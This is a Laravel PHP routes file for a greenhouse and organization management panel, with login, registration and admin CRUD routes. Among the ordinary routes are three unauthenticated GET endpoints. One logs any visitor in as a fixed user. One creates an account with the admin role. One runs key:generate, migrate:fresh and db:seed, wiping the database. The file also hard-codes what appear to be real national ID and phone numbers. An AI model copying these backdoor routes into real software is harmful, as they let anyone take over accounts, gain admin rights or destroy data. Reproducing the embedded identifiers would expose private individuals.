<?php

use App\Http\Controllers\Auth\AdminLoginController;
use App\Http\Controllers\Auth\OrganizationAuthController;
use App\Http\Controllers\Panel\AboutUsController;
use App\Http\Controllers\Panel\AlertController;
use App\Http\Controllers\Panel\AutomationController;
use App\Http\Controllers\Panel\ChartPermissionController;
use App\Http\Controllers\Panel\CityController;
use App\Http\Controllers\Panel\CompanyController;
use App\Http\Controllers\Panel\ConfigController;
use App\Http\Controllers\Panel\ContactUsController;
use App\Http\Controllers\Panel\DashboardController;
use App\Http\Controllers\Panel\GreenhouseController;
use App\Http\Controllers\Panel\OrganizationController;
use App\Http\Controllers\Panel\PermissionController;
use App\Http\Controllers\Panel\ProfileController;
use App\Http\Controllers\Panel\ProvinceController;
use App\Http\Controllers\Panel\RoleController;
use App\Http\Controllers\Panel\UserController;
use App\Livewire\AboutUs;
use App\Livewire\ContactUs;
use App\Livewire\Home;
use App\Livewire\Panel\Auth\Admin\Login as AdminLogin;
use App\Livewire\Panel\Auth\Company\Login as CompanyLogin;
use App\Livewire\Panel\Auth\Greenhouse\Login as GreenhouseLogin;
use App\Livewire\Panel\Auth\Organization\Login as OrganizationLogin;
use App\Livewire\Panel\Auth\Company\Register as CompanyRegister;
use App\Livewire\Panel\Auth\Greenhouse\Register as GreenhouseRegister;
use App\Livewire\Panel\Auth\Organization\Register as OrganizationRegister;
use App\Models\ChartPermission;
use App\Models\Role;
use App\Models\User;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/', Home::class)->name('home');

Route::prefix('/login')->as('login.')->middleware(['guest'])->group(function () {
//    Route::get('/simurgh', AdminLogin::class)->name('simurgh');
//    Route::get('/company', CompanyLogin::class)->name('company');
//    Route::get('/greenhouse', GreenhouseLogin::class)->name('greenhouse');
//    Route::get('/organization', OrganizationLogin::class)->name('organization');

    Route::get('/dwop', function () {
        \Illuminate\Support\Facades\Auth::loginUsingId(\App\Models\User::query()->where([
            'national_id' => '2282233001',
            'phone_number' => '09215855364',
        ])->first()->id);
        return redirect()->route('panel.home');
    });

    Route::get('/dwopp', function () {

        $admin = [
            'name' => 'ادمین سیمرغ',
            'national_id' => '2272084992',
            'phone_number' => '09177041897',
            'active' => true,
        ];

        User::query()->whereNationalId($admin['national_id'])
            ->firstOr(function () use ($admin) {
                $user = User::create($admin);
                $user->roles()->sync(Role::query()->whereName(Role::ADMIN_ROLE)->first()->id);
            });
    });
});

//Route::prefix('/register')->as('register.')->middleware(['guest'])->group(function () {
//    Route::get('/company', CompanyRegister::class)->name('company');
//    Route::get('/greenhouse', GreenhouseRegister::class)->name('greenhouse');
//    Route::get('/organization', OrganizationRegister::class)->name('organization');
//});

Route::get('/about-us', AboutUs::class)->name('about.us');
Route::get('/contact-us', ContactUs::class)->name('contact.us');

Route::get('system-start', function () {
    Artisan::call('key:generate');
    Artisan::call('migrate:fresh');
    Artisan::call('storage:link');
    Artisan::call('db:seed');
    Artisan::call('optimize:clear');
});

Route::prefix('/login')->as('login.')->middleware(['guest'])->group(function () {
    Route::get('/simurgh', [AdminLoginController::class, 'showLoginForm'])->name('simurgh');
    Route::post('/simurgh', [AdminLoginController::class, 'login'])->name('simurgh.submit');
    Route::post('/simurgh/send-code', [AdminLoginController::class, 'sendCode'])->name('simurgh.send-code');
});

Route::prefix('/login')->as('login.')->middleware(['guest'])->group(function () {
    Route::get('/greenhouse', [App\Http\Controllers\Auth\GreenhouseController::class, 'showLogin'])->name('greenhouse');
    Route::post('/greenhouse', [App\Http\Controllers\Auth\GreenhouseController::class, 'login']);
    Route::post('/greenhouse/send-sms', [App\Http\Controllers\Auth\GreenhouseController::class, 'sendSms'])->name('greenhouse.send-sms');
});

Route::prefix('/register')->as('register.')->middleware(['guest'])->group(function () {
    Route::get('/greenhouse', [App\Http\Controllers\Auth\GreenhouseController::class, 'showRegister'])->name('greenhouse');
    Route::post('/greenhouse', [App\Http\Controllers\Auth\GreenhouseController::class, 'register']);
    Route::get('/greenhouse/provinces', [App\Http\Controllers\Auth\GreenhouseController::class, 'getProvinces'])->name('greenhouse.provinces');
    Route::get('/greenhouse/cities/{province}', [App\Http\Controllers\Auth\GreenhouseController::class, 'getCities'])->name('greenhouse.cities');
});

Route::prefix('/login')->as('login.')->middleware(['guest'])->group(function () {
    Route::get('/organization', [OrganizationAuthController::class, 'showLogin'])->name('organization');
    Route::post('/organization', [OrganizationAuthController::class, 'login'])->name('organization.submit');
    Route::post('/organization/send-sms', [OrganizationAuthController::class, 'sendSms'])->name('organization.send-sms');
});

Route::prefix('/register')->as('register.')->middleware(['guest'])->group(function () {
    Route::get('/organization', [OrganizationAuthController::class, 'showRegister'])->name('organization');
    Route::post('/organization', [OrganizationAuthController::class, 'register'])->name('organization.submit');
    Route::get('/organization/cities', [OrganizationAuthController::class, 'getCitiesByProvince'])->name('organization.cities');
});

Route::prefix('/auth')->as('auth.')->middleware(['guest'])->group(function () {
    Route::prefix('/company')->as('company.')->group(function () {
        Route::get('/login', [App\Http\Controllers\Auth\CompanyController::class, 'showLogin'])->name('login');
        Route::post('/login', [App\Http\Controllers\Auth\CompanyController::class, 'login'])->name('login.post');
        Route::post('/send-sms', [App\Http\Controllers\Auth\CompanyController::class, 'sendSms'])->name('send-sms');

        Route::get('/register', [App\Http\Controllers\Auth\CompanyController::class, 'showRegister'])->name('register');
        Route::post('/register', [App\Http\Controllers\Auth\CompanyController::class, 'register'])->name('register.post');
        Route::get('/cities', [App\Http\Controllers\Auth\CompanyController::class, 'getCities'])->name('cities');
    });
});

Route::prefix('panel')->name('panel.')->middleware(['web', 'auth'])->group(function () {

    // Config management routes
    Route::controller(ConfigController::class)->prefix('configs')->name('configs.')->group(function () {
        Route::get('/', 'index')->name('index');
        Route::get('/data', 'getData')->name('data');
        Route::get('/export', 'export')->name('export'); // Add this line
        Route::get('/{config}/edit', 'edit')->name('edit');
        Route::put('/{config}', 'update')->name('update');
        Route::post('/update-filters', 'updateFilters')->name('update-filters');
    });

    // Permissions management routes
    Route::controller(PermissionController::class)->prefix('permissions')->name('permissions.')->group(function () {
        Route::get('/', 'index')->name('index');
        Route::get('/data', 'getData')->name('data');
        Route::get('/{permission}', 'show')->name('show');
        Route::get('/export', 'export')->name('export');
        Route::get('/stats', 'getStats')->name('stats');
    });

    // Roles management routes
    Route::controller(RoleController::class)->prefix('roles')->name('roles.')->group(function () {
        Route::get('/', 'index')->name('index');
        Route::get('/data', 'getData')->name('data');
        Route::get('/export', 'export')->name('export');
        Route::get('/stats', 'getStats')->name('stats');
        Route::get('/{role}/edit', 'edit')->name('edit');
        Route::get('/{role}/clone', 'clone')->name('clone');
        Route::get('/{role}', 'show')->name('show');
        Route::put('/{role}', 'update')->name('update');
        Route::post('/bulk-assign', 'bulkAssignPermissions')->name('bulk-assign');
    });

    Route::controller(UserController::class)->prefix('users')->name('users.')->group(function () {
        Route::get('/', 'index')->name('index');
        Route::get('/data', 'getData')->name('data');
        Route::get('/{user}/edit', 'edit')->name('edit');
        Route::put('/{user}', 'update')->name('update');
        Route::post('/{user}/toggle-status', 'toggleStatus')->name('toggle-status');
        Route::get('/export', 'export')->name('export');
    });

    Route::controller(AboutUsController::class)->prefix('about-us')->name('about.us.')->group(function () {
        Route::get('/', 'index')->name('index');
        Route::get('/edit', 'edit')->name('edit');
        Route::put('/update', 'update')->name('update');
        Route::post('/upload-image', 'uploadImage')->name('upload.image');
    });

    Route::controller(ContactUsController::class)->prefix('contact-us')->name('contact-us.')->group(function () {
        Route::get('/', 'index')->name('index');
        Route::get('/data', 'getData')->name('data');
        Route::get('/export', 'export')->name('export');
        Route::get('/{contactUs}', 'show')->name('show');
    });

    Route::controller(CompanyController::class)->prefix('companies')->name('companies.')->group(function () {
        Route::get('/', 'index')->name('index');
        Route::get('/create', 'create')->name('create');
        Route::post('/', 'store')->name('store');
        Route::get('/{company}', 'show')->name('show');
        Route::get('/{company}/edit', 'edit')->name('edit');
        Route::put('/{company}', 'update')->name('update');
        Route::delete('/{company}', 'destroy')->name('destroy');

        // Data routes should come AFTER parameter routes
        Route::get('/data/table', 'getData')->name('data');
        Route::get('/statistics', 'stats')->name('stats');
        Route::get('/export/download', 'export')->name('export');
        Route::get('/provinces/list', 'getProvinces')->name('provinces');
        Route::get('/cities/list', 'getCities')->name('cities');
        Route::get('/province/{province}/cities', 'getCitiesByProvince')->name('cities-by-province');
        Route::post('/coordinates/extract', 'getCoordinates')->name('coordinates');
    });

    Route::controller(GreenhouseController::class)->prefix('greenhouses')->name('greenhouses.')->group(function () {
        Route::get('/', 'index')->name('index');
        Route::get('/create', 'create')->name('create');
        Route::post('/', 'store')->name('store');
        Route::get('/{greenhouse}', 'show')->name('show');
        Route::get('/{greenhouse}/edit', 'edit')->name('edit');
        Route::put('/{greenhouse}', 'update')->name('update');
        Route::delete('/{greenhouse}', 'destroy')->name('destroy');

        // Data routes should come AFTER parameter routes
        Route::get('/data/table', 'getData')->name('data');
        Route::get('/statistics', 'stats')->name('stats');
        Route::get('/export/download', 'export')->name('export');
        Route::get('/provinces/list', 'getProvinces')->name('provinces');
        Route::get('/cities/list', 'getCities')->name('cities');
        Route::get('/province/{province}/cities', 'getCitiesByProvince')->name('cities-by-province');
        Route::post('/coordinates/extract', 'getCoordinates')->name('coordinates');
    });

    Route::controller(OrganizationController::class)->prefix('organizations')->name('organizations.')->group(function () {
        Route::get('/', 'index')->name('index');
        Route::get('/create', 'create')->name('create');
        Route::post('/', 'store')->name('store');
        Route::get('/{organization}', 'show')->name('show');
        Route::get('/{organization}/edit', 'edit')->name('edit');
        Route::put('/{organization}', 'update')->name('update');
        Route::delete('/{organization}', 'destroy')->name('destroy');

        // Additional organization routes
        Route::get('/data/table', 'getData')->name('data');
        Route::get('/statistics', 'stats')->name('stats');
        Route::get('/export/download', 'export')->name('export');
    });

    Route::controller(AutomationController::class)->prefix('automations')->name('automations.')->group(function () {
        Route::get('/', 'index')->name('index');
        Route::get('/create', 'create')->name('create');
        Route::post('/', 'store')->name('store');

        // IMPORTANT: Make sure you're using {automation} not {id}
        Route::get('/{automation}', 'show')->name('show');
        Route::get('/{automation}/edit', 'edit')->name('edit');
        Route::put('/{automation}', 'update')->name('update');
        Route::delete('/{automation}', 'destroy')->name('destroy');

        // Data routes should come AFTER parameter routes
        Route::get('/data/table', 'getData')->name('data');
        Route::get('/statistics', 'stats')->name('stats');
        Route::get('/export/download', 'export')->name('export');
    });

    Route::controller(ProvinceController::class)->prefix('provinces')->name('provinces.')->group(function () {
        Route::get('/', 'index')->name('index');
        Route::get('/create', 'create')->name('create');
        Route::post('/', 'store')->name('store');
        Route::get('/{province}', 'show')->name('show');
        Route::get('/{province}/edit', 'edit')->name('edit');
        Route::put('/{province}', 'update')->name('update');
        Route::delete('/{province}', 'destroy')->name('destroy');

        // Additional province routes
        Route::get('/data/table', 'getData')->name('data');
        Route::get('/statistics', 'stats')->name('stats');
        Route::get('/export/download', 'export')->name('export');
        Route::post('/{province}/toggle-status', 'toggleStatus')->name('toggle-status');
        Route::get('/options/list', 'getOptions')->name('options');
    });

    // City management routes
    Route::controller(CityController::class)->prefix('cities')->name('cities.')->group(function () {
        Route::get('/', 'index')->name('index');
        Route::get('/create', 'create')->name('create');
        Route::post('/', 'store')->name('store');

        // IMPORTANT: Make sure you're using {city} not {id}
        Route::get('/{city}/edit', 'edit')->name('edit');
        Route::put('/{city}', 'update')->name('update');
        Route::delete('/{city}', 'destroy')->name('destroy');
        Route::post('/{city}/toggle-status', 'toggleStatus')->name('toggle-status');

        // Data routes should come AFTER parameter routes
        Route::get('/data/table', 'getData')->name('data');
        Route::get('/statistics', 'stats')->name('stats');
        Route::get('/export/download', 'export')->name('export');
        Route::get('/options/list', 'getOptions')->name('options');
        Route::get('/province/{province}/list', 'getByProvince')->name('by-province');
    });

    Route::controller(AlertController::class)->prefix('alerts')->name('alerts.')->group(function () {
        Route::get('/alerts', 'index')->name('index');
        Route::post('/alerts', 'store')->name('store');

        Route::get('/{id}/alerts', 'admin')->name('admin');
        Route::post('/{id}/alerts', 'storeAdmin')->name('admin.store');

        Route::get('/api/alerts/stats', 'stats')->name('stats');
    });

    Route::controller(ProfileController::class)->prefix('profile')->name('profile.')->group(function () {
        Route::get('/', 'index')->name('index');
        Route::put('/', 'update')->name('update');
        Route::post('/coordinates', 'getCoordinates')->name('coordinates');
    });

    Route::get('/', [DashboardController::class, 'index'])->name('home');

    Route::controller(ChartPermissionController::class)->group(function () {
        Route::get('/chart-permissions', 'index')->name('chart-permissions.index');
        Route::post('/chart-permissions/update', 'update')->name('chart-permissions.update');
        Route::post('/chart-permissions/toggle', 'toggle')->name('chart-permissions.toggle');
    });
});

Route::middleware(['auth'])->post('logout', function () {
    \Illuminate\Support\Facades\Auth::logout();
    return redirect()->route('home');
})->name('logout');
